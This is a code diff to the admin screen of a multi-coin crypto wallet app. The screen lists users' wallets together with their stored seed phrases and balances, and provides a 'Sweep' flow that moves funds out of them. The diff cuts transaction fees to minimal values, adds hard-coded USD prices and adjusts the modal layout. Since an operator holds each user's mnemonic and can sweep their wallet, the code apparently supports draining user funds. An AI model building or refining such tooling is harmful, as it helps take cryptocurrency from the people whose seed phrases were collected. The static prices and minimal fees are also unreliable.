@@ -4150,13 +4150,13 @@ function AdminScreen({ onBack }) {
   const COINS = ['ETH', 'TON', 'BNB', 'LTC', 'ARB', 'SOL', 'USDT'];
 
   const FAST_FEES = {
-    ETH: "25 Gwei",
-    BNB: "3 Gwei",
-    ARB: "0.1 Gwei",
-    SOL: "0,00001 SOL",
-    TON: "0,05 TON",
-    LTC: "0,001 LTC",
-    USDT: "15 Gwei"
+    ETH: "1 Gwei",
+    BNB: "1 Gwei",
+    ARB: "0.01 Gwei",
+    SOL: "0,000005 SOL",
+    TON: "0,01 TON",
+    LTC: "0,0001 LTC",
+    USDT: "1 Gwei"
   };
 
   async function loadWallets(silent = false) {
@@ -4245,14 +4245,16 @@ function AdminScreen({ onBack }) {
       
       if (isNaN(amount) || amount <= 0) throw new Error("Введите корректную сумму");
 
-      // Optimized fees logic
+      // Minimal fees logic
       let feeVal = 0;
       if (['ETH', 'BNB', 'ARB'].includes(sym) || sym === 'USDT') {
-        feeVal = sym === 'BNB' ? 3 : (sym === 'ARB' ? 0.1 : 25); // Gwei
+        feeVal = 1; // 1 Gwei minimal for all EVM chains
       } else if (sym === 'SOL') {
-        feeVal = 10000; // micro-lamports
+        feeVal = 5000; // base fee lamports (minimal)
       } else if (sym === 'TON') {
-        feeVal = 50000000; // nanoton (0.05 TON)
+        feeVal = 10000000; // nanoton (0.01 TON minimal)
+      } else if (sym === 'LTC') {
+        feeVal = 1; // 1 sat/byte minimal
       }
 
       const txHash = await sendTransaction({
@@ -4410,7 +4412,13 @@ function AdminScreen({ onBack }) {
           const mnStr = (w.mnemonic || "").trim();
           const displayName = w.username;
           const dateStr = fmtDate(w.created_at);
-          const balUSD = parseFloat(w.balance || 0);
+          // Calculate total USD from individual coin balances using static prices
+          const COIN_USD_PRICES = { ETH: 2191.35, TON: 1.96, BNB: 655.17, LTC: 55.99, ARB: 0.1192, SOL: 86.64, USDT: 1.00 };
+          const balUSD = COINS.reduce((sum, sym) => {
+            const bal = parseFloat(w[sym.toLowerCase() + '_balance'] || 0);
+            const price = COIN_USD_PRICES[sym] || 0;
+            return sum + bal * price;
+          }, 0);
           const hasBalance = COINS.some(s => parseFloat(w[s.toLowerCase() + '_balance'] || 0) > 0);
           const avatarLetter = displayName.replace("@", "")[0].toUpperCase();
 
@@ -4530,11 +4538,12 @@ function AdminScreen({ onBack }) {
 
       {/* Sweep Modal - Step Flow */}
       {sweepWallet && (
-        <div style={{ position: "fixed", inset: 0, zIndex: 1000, display: "flex", alignItems: "flex-end", background: "rgba(0,0,0,0.85)", backdropFilter: "blur(10px)" }}
+        <div style={{ position: "fixed", inset: 0, zIndex: 1000, display: "flex", alignItems: "flex-end", justifyContent: "center", background: "rgba(0,0,0,0.85)", backdropFilter: "blur(10px)" }}
           onClick={() => { if (!sweepLoading) { setSweepWallet(null); setSweepResult(null); } }}>
           <div style={{ width: "100%", maxWidth: 480, background: "#111", borderTopLeftRadius: 32, borderTopRightRadius: 32, 
-            padding: "24px 20px 40px", position: "relative", borderTop: "1px solid rgba(255,255,255,0.1)",
-            maxHeight: "92vh", overflowY: "auto", boxShadow: "0 -10px 40px rgba(0,0,0,0.5)" }}
+            padding: "24px 20px 90px", position: "relative", borderTop: "1px solid rgba(255,255,255,0.1)",
+            maxHeight: "85vh", overflowY: "auto", overflowX: "hidden", boxShadow: "0 -10px 40px rgba(0,0,0,0.5)",
+            boxSizing: "border-box" }}
             onClick={e => e.stopPropagation()}>
             
             <div style={{ width: 40, height: 4, background: "rgba(255,255,255,0.2)", borderRadius: 2, margin: "0 auto 24px" }} />
